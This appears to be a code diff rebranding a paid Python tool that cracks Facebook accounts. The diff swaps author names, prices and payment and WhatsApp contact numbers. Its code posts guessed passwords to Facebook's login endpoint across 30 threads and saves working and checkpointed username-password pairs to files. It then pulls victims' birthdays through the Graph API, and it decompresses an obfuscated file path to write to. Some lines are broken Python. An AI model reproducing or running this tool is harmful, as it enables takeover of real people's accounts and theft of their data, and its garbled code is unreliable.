@@ -3,19 +3,19 @@ import os
 try:
     import requests
 except ImportError:
-    print('\n [âœ“] installing requests !...\n')
+    print('\n [✓] installing requests !...\n')
     os.system('pip install requests')
 
 try:
     import concurrent.futures
 except ImportError:
-    print('\n [âœ“] installing futures !...\n')
+    print('\n [✓] installing futures !...\n')
     os.system('pip install futures')
 
 try:
     import bs4
 except ImportError:
-    print('\n [âœ“] installing bs4 !...\n')
+    print('\n [✓] installing bs4 !...\n')
     os.system('pip install bs4')
 
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
@@ -80,22 +80,22 @@ logo =                                          """
    \033[1;37m##    ##    ##    ##    ##     ## 
    \033[1;37m ######      ######     ########  
 \x1b[1;97m------------------------\x1b[1;97m------------------------
-\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Ali Raza Malik
-\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          NON STOP ðŸ™„
-\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           MALIK BRAND
-\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             4.0.0
+\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Sarfraz Baloch
+\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Sarfraz Baloch
+\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Sarfraz-Ssb
+\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             6.0.0
 \033[1;37m------------------------\033[1;37m------------------------ """                                              
 
 def hasil(OK,cp):
 	if not len(OK) != 0:
 	    pass
 	if len(cp) != 0:
-	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mRaza_OK.txt' % (H, P, str(len(ok))))
-	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mRaza_CP.txt' % (H, P, str(len(cp))))
-	    input("\x1b[1;97mPress enter to back Raza Menu ")
-	    Ali Raza()
+	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSSB_OK.txt' % (H, P, str(len(ok))))
+	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSSB_CP.txt' % (H, P, str(len(cp))))
+	    input("\x1b[1;97mPress enter to back SSB Menu ")
+	    sarfraz()
 
-def Ali Raza():
+def sarfraz():
 
 
 
@@ -114,7 +114,7 @@ def Ali Raza():
     print('')
     _sarfraz___ = input(' [?] Choose option : ')
     if _sarfraz___ in ('1', '01'):
-        __xxx__().Ali Razax(id)
+        __xxx__().sarfrazx(id)
     if _sarfraz___ in ('2', '02'):
         os.system('python dm.py')
     if _sarfraz___ in ('E', 'ee'):
@@ -124,7 +124,7 @@ def Ali Raza():
 class __xxx__:
     def __init__(self):
         self.id = []
-    def Ali Razax(self,id):
+    def sarfrazx(self,id):
   
        
       
@@ -143,10 +143,10 @@ class __xxx__:
             self.__pler__()
         else:
             print(' [!] Choose Correct One');
-            self.Ali Razax(id)
+            self.sarfrazx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f"\r \x1b[1;97m[Raza] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
+        sys.stdout.write(f"\r \x1b[1;97m[SSB] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -196,10 +196,10 @@ class __xxx__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H} [Raza-OK] {user} | {pw}")
+                    print(f"\r{H} [SSB-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('Raza_OK.txt' , 'a').write('%s\n' % wrt)
+                    open('SSB_OK.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -208,10 +208,10 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s [Raza-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s [SSB-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('Raza_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -219,10 +219,10 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [Raza-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s [SSB-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('Raza_CP.txt' , 'a').write('%s\n' % wrt)
+                    open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
@@ -279,7 +279,7 @@ class __xxx__:
             print('\033[1;37m Total IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with Ali_Raza(max_workers=30) as ssbworld:
+            with sarfrazssb(max_workers=30) as ssbworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -325,10 +325,10 @@ def bnsbuy():
         print
         print ('\r\x1b[1;97m Your Token : ' + to + '\n')
         print
-        print('\rTool Price 300rs\n')
+        print('\rTool Price 350rs\n')
         print
-        print('\rWatspp Number 03073665758\n')
-        print('\rAccount Number  Wp Contact\n')
+        print('\rjazzcash Account Number 03033212619\n')
+        print('\rAccount Name Nazeer Ahmed\n')
         print
         print
         print('\rPayment Successfully Msg Or Token Send\n')
@@ -339,8 +339,8 @@ def bnsbuy():
         ss = input('\rPaste Here your Token:')
         print('\n')
         print('\rYour Request Submitted Please wait  ')
-        tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+Raza+'%20Token%20:%20'+ss
-        os.system('am start https://wa.me/+923073665758?text=' + tks)
+        tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+sb+'%20Token%20:%20'+ss
+        os.system('am start https://wa.me/+923206620269?text=' + tks)
 #        subprocess.check_output(['am', 'start', url_wa + quote(tks)])
 
 def bnsreg():
@@ -348,14 +348,14 @@ def bnsreg():
     print (logo)
     print ('\x1b[1;97m\tYour Token Is Not Subscribed\n')
     print
-    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~Raza=="
+    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~SSB=="
     print
     print ('\n\x1b[1;97m Your Token: \x1b[97m' + id + '\n')
     print
     print('\rTool Price 350rs\n')
     print
-    print('\rWp_Account Number 03073665758\n')
-    print('\rAccount Number Wp Contact\n')
+    print('\rjazzcash Account Number 03033212619\n')
+    print('\rAccount Name Nazeer Ahmed\n')
     print
     print('\rPayment Successfully Msg Or Token Send\n')
     print
@@ -364,8 +364,8 @@ def bnsreg():
     ss = input('\rPaste Here your Token:')
     print ('\n')
     print('Your Request Submitted Please wait  ')
-    tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+Raza+'%20Token%20:%20'+ss
-    os.system('am start https://wa.me/+923073665758?text=' + tks)
+    tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+sb+'%20Token%20:%20'+ss
+    os.system('am start https://wa.me/+923206620269?text=' + tks)
     f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\xa4\xcc<\x00}\x1e\x11\x17')
     bd = (zlib.decompress(f))
     sav = open(bd, 'w') 
@@ -387,4 +387,4 @@ class load:
             time.sleep(0.1)
         print('\n')
 
-Ali Raza()
+sarfraz()
